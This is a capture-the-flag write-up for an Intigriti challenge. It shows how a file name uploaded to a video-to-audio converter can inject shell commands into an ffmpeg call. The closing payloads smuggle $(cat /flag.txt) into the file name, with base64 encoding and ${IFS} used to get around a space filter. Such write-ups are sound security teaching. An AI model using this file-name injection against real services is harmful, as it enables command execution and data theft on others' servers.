Video to Audio converter: https://challenge-0723.intigriti.io/challenge

+ When we upload a mp4 file, it returns a .wav file
+ checking the metadata of the file, we can see something like this: Software: Lavf58.20.100
+ Note: FFmpeg also includes other tools: … libavformat (Lavf), an audio/video container mux and demux library
+ Muxing/Demuxing basically means joining/splitting signals apart– like splitting apart the audio from a video file.
+ If the server is indeed passing our file to ffmpeg on the command line, the command being run is probably something like

`ffmpeg -i <our file> -vn -acodec copy extracted_audio.wav`
+ we can cat our flag but redirect it into extracted_audio.wav.
+ the command was likely something like:
`ffmpeg -i <our filename> -vn -acodec copy /somefolder/folder/extracted_audio.wav`
What if our injection made ffmpeg write the flag into extracted_audio.wav
+  if we take a look at the ffmpeg documentation, we can see a -metadata tag.
```
-metadata[:metadata_specifier] key=value (output,per-metadata)
Set a metadata key/value pair.

An optional metadata_specifier may be given to set metadata on streams, chapters or programs. See -map_metadata documentation for details.

This option overrides metadata set with -map_metadata. It is also possible to delete metadata by using an empty value.

For example, for setting the title in the output file:

ffmpeg -i in.avi -metadata title="my title" out.flv
To set the language of the first audio stream:

ffmpeg -i INPUT -metadata:s:a:0 language=eng OUTPUT
```
+ We'll follow their example and try to set the title of extracted_audio.wav to the contents of /flag.txt. We'll send this filename:

`sample.mp4 -metadata title=$(cat /flag.txt).mp4`
To hopefully produce this executed command:

`ffmpeg -i sample.mp4 -metadata title=$(cat /flag.txt).mp4 -vn -acodec copy /somefolder/folder/extracted_audio.wav`
In our actual payload, we'll base64 encode the cat /flag.txt part and replace any spaces with ${IFS} to ensure we don't have to deal with the filter. This gives us a final payload of:

`sample-mp4-file-small.mp4${IFS}-metadata${IFS}title=$(eval${IFS}$(echo${IFS}Y2F0IC9mbGFnLnR4dA==|base64${IFS}-d)).mp4`
and we get the flag.
